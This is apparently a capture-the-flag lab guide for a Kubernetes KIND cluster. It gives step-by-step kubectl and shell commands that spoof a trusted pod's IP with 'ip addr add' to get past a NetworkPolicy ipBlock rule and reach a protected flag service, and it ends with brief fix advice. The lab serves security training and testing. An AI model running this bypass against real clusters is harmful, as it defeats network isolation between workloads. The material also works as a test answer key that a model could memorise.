# K8S-30: CNI IP Spoofing (NetworkPolicy Bypass)

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-30 |
| 名称 | CNI IP Spoofing (NetworkPolicy Bypass) |
| 技术/CVE | N/A (IP spoofing) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：N/A (IP spoofing)
- 难度：L2
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (IP spoofing NetworkPolicy bypass) |
| Difficulty | L2 |
| Type | k8s (KIND cluster, multi-node) |
| Cluster Name | cve-k8s-30-cni-spoof |
| Flag Location | `/flag.txt` in flag-pod (trust-zone namespace) |

## Attack Path Summary
```
Attacker pod (untrust-zone, blocked by NetworkPolicy) → Discover trusted pod IP (10.244.1.x) → IP spoofing: add trusted IP to attacker pod interface → Bypass ipBlock CIDR check → Access flag service
```

## Prerequisites

### Knowledge
- Kubernetes NetworkPolicy ipBlock: Understanding that allowing traffic from an IP CIDR block checks the source IP of the packet
- CNI networking: Pod IPs are assigned from the CNI subnet and can be manipulated within the pod's network namespace
- IP aliasing: Adding a secondary IP address to an interface in Linux (ip addr add)

### Tools
- kubectl: K8s API interaction
- ip: Linux IP address management

## Step-by-Step Exploitation

### Step 1: Verify NetworkPolicy Blocks Traffic
```bash
FLAG_IP=$(kubectl get svc flag-svc -n trust-zone -o jsonpath='{.spec.clusterIP}')
kubectl exec -n untrust-zone attacker-pod -- wget -qO- --timeout=3 http://${FLAG_IP}:8080
# Should FAIL — blocked by NetworkPolicy
```

### Step 2: Discover Allowed IP Range
```bash
kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml
# Ingress allows: ipBlock cidr: 10.244.1.0/24
```

### Step 3: Find Trusted Pod's IP
```bash
TRUSTED_IP=$(kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}')
echo "Trusted IP: $TRUSTED_IP"
```

### Step 4: Spoof IP to Bypass NetworkPolicy
```bash
kubectl exec -n untrust-zone attacker-pod -- ip addr add ${TRUSTED_IP}/32 dev eth0
kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080
# Success — NetworkPolicy sees source IP matching the allowed CIDR
```

## Flag Location
- `/flag.txt` in `flag-pod` (trust-zone namespace)
- Accessible after IP spoofing bypasses the NetworkPolicy ipBlock restriction

## Verification Commands
```bash
kubectl cluster-info --context kind-cve-k8s-30-cni-spoof
kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | CNI networking, pod IP identity, and NetworkPolicy |
| 侦察与前置条件 | CNI address assignment and IP-based policy assumptions |
| 核心漏洞与利用 | Spoof a pod IP to bypass NetworkPolicy |
| 权限、横向或影响 | Cross-workload network access |
| 验证 | Reach the protected endpoint and capture the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
